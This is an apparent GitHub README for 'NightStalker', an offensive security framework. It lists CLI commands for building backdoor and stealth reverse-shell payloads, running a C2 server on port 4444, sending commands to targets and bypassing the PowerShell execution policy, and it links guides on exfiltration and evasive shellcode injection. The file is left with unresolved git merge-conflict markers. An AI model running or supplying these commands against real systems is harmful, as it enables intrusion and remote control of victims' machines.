<<<<<<< HEAD
# 🌙 NightStalker - Advanced Offensive Security Framework

A comprehensive offensive security framework featuring two specialized subsystems for web exploitation and advanced red teaming operations.

## 🚀 Quick Start

### 🌐 Web Exploitation (NightStalkerWeb)
```bash
# Install web exploitation framework
python setup/install_web_exploit_framework.py

# Launch TUI interface
python -m nightstalker.redteam.web_exploit_tui

# Or use CLI
python -m nightstalker.cli webred scan --url https://target.com
```

### 🦠 Malware & Red Teaming (NightStalker)
```bash
# Install full framework
pip install -r setup/requirements.txt

# Install CLI launcher (recommended)
chmod +x install_nightstalker.sh
./install_nightstalker.sh

# Use the launcher from anywhere
nightstalker                    # Interactive menu
nightstalker stealth build      # Build stealth payload
nightstalker stealth server     # Start C2 server
nightstalker stealth demo       # Run demonstration

# Or use direct CLI commands
python -m nightstalker.cli payload build --type backdoor --format python
python -m nightstalker.cli reverse-shell deploy
python -m nightstalker.cli redteam attack --target 10.0.0.5
```

### 🖥️ Windows Users
```cmd
# Use the batch file launcher (no PowerShell execution policy issues)
.\nightstalker.bat --help
.\nightstalker.bat stealth build --lhost 192.168.1.100 --lport 4444
.\nightstalker.bat stealth server --host 0.0.0.0 --port 4444

# Or use PowerShell launcher (requires execution policy bypass)
powershell -ExecutionPolicy Bypass -File nightstalker.ps1 --help
powershell -ExecutionPolicy Bypass -File nightstalker.ps1 stealth demo
```

## 📚 Documentation

### 📖 Core Documentation
- **[Main Documentation](docs/core/README.md)** - Complete project overview
- **[Directory Structure](docs/core/DIRECTORY_STRUCTURE.md)** - Project organization
- **[Framework Selection](docs/core/FRAMEWORK_SELECTION_GUIDE.md)** - Choose the right framework
- **[File Organization](docs/core/FILE_ORGANIZATION_GUIDE.md)** - File categorization
- **[Project Structure](docs/core/PROJECT_STRUCTURE_OVERVIEW.md)** - Visual structure overview

### 🌐 Web Exploitation Framework
- **[Web Framework Guide](docs/web/WEB_EXPLOIT_FRAMEWORK_README.md)** - Complete web exploitation guide
- **[Web Red Teaming](docs/web/WEB_RED_TEAMING_GUIDE.md)** - Web red teaming techniques

### 🦠 Red Teaming Framework
- **[Linux Deployment](docs/redteam/LINUX_DEPLOYMENT_GUIDE.md)** - Linux setup and deployment
- **[Exfiltration Guide](docs/redteam/EXFILTRATION_GUIDE.md)** - Data exfiltration techniques
- **[Covert Server](docs/redteam/COVERT_SERVER_GUIDE.md)** - Covert server setup
- **[Tor Setup](docs/redteam/TOR_QUICK_SETUP.md)** - Tor hidden service setup
- **[Reverse Shell Deployer](docs/REVERSE_SHELL_DEPLOYER.md)** - Reverse shell deployment with obfuscation
- **[Stealth C2 Guide](docs/STEALTH_C2_GUIDE.md)** - Covert command & control system
- **[Advanced Injector Guide](docs/ADVANCED_INJECTOR_GUIDE.md)** - Advanced shellcode injection with evasion
- **[Stealth Payload Guide](docs/STEALTH_PAYLOAD_GUIDE.md)** - Stealth reverse shell payload with anti-detection

## 🧪 Examples & Testing

### 📋 Examples
- **[Main Demo](examples/demo.py)** - Framework demonstration
- **[Payload Building](examples/payloads/)** - Payload creation examples
- **[Exfiltration](examples/exfiltration/)** - Data exfiltration examples
- **[Web Red Teaming](examples/webred/)** - Web exploitation examples
- **[Reverse Shell Demo](examples/reverse_shell_demo.py)** - Reverse shell deployment demonstration
- **[Advanced Injector](payloads/advanced_injector.cpp)** - Advanced shellcode injection with evasion
- **[Shellcode Generator](payloads/shellcode_generator.py)** - Shellcode generation and encryption utility
- **[Stealth Payload](payloads/stealth_reverse_shell.py)** - Stealth reverse shell with anti-detection
- **[Payload Builder](payloads/payload_builder.py)** - CLI payload builder with customization
- **[C2 Server](payloads/c2_server.py)** - Simple C2 server for testing
- **[Stealth Demo](payloads/demo_stealth_payload.py)** - Complete stealth payload demonstration
  nightstalker webred report --input results.json --output report.html
  nightstalker reverse-shell deploy
  nightstalker reverse-shell list
  nightstalker c2 deploy
  nightstalker c2 send --target-id TARGET001 --command "whoami"

### 🧪 Testing
- **[Unit Tests](tests/unit/)** - Individual component testing
- **[Integration Tests](tests/integration/)** - Framework integration testing
- **[Compatibility Tests](tests/compatibility/)** - Cross-platform testing

## 🛠️ Setup & Installation

### 📦 Installation Files
- **[Requirements](setup/requirements.txt)** - Python dependencies
- **[Setup Script](setup/setup.py)** - Framework installation
- **[Linux Installer](setup/install.sh)** - Linux installation script
- **[Web Framework Installer](setup/install_web_exploit_framework.py)** - Web framework setup

### 🎨 User Interfaces
- **[GUI Builder](scripts/gui_exe_builder.py)** - GUI payload builder
- **[Web TUI](nightstalker/redteam/web_exploit_tui.py)** - Web exploitation TUI

## 📊 Data & Configuration

### ⚙️ Configuration
- **[Config Directory](data/config/)** - Framework configuration files
- **[JSON Data](data/json/)** - JSON configuration and status files
- **[Log Files](data/logs/)** - Framework operation logs

## 🏗️ Framework Structure

### 🌐 NightStalkerWeb
```
nightstalker_web/
├── modules/          # Recon, exploit, bruteforce, post modules
├── tools/            # Installed security tools (Sn1per, etc.)
├── loot/             # Target-specific results
└── bin/              # Wrapper scripts
```

### 🦠 NightStalker
```
nightstalker/
├── redteam/          # Red teaming modules (C2, exfiltration, etc.)
├── pentest/          # Penetration testing
├── core/             # Core framework
├── builder/          # Payload building
└── cli.py            # Command-line interface
```

## 🎯 Use Cases

### 🌐 NightStalkerWeb
- **Web Application Security Testing**
- **Vulnerability Assessment**
- **Penetration Testing**
- **Bug Bounty Hunting**

### 🦠 NightStalker
- **Red Team Operations**
- **Advanced Persistent Threat Simulation**
- **Malware Research**
- **Incident Response Training**

## 🔒 Security & Ethics

**IMPORTANT**: This framework is designed for authorized security testing and educational purposes only.

- **Authorization Required**: Only test systems you own or have explicit permission to test
- **Educational Purpose**: Use for learning and authorized security assessments
- **No Malicious Use**: Do not use for unauthorized access or malicious activities
- **Compliance**: Follow all applicable laws and regulations

## 📞 Support

- **Documentation**: Check the guides in the `docs/` directory
- **Examples**: Review the example scripts in `examples/`
- **Testing**: Run tests in the `tests/` directory
- **Issues**: Report bugs on GitHub Issues

---

**Remember**: Always obtain proper authorization before testing any systems, and follow responsible disclosure practices when reporting vulnerabilities.

**Happy Hacking! 🎯** 
=======
# nightstalker
M Custom Prompt Made Framework
>>>>>>> c2390586fe079888898d7dc2887592a6b1848914
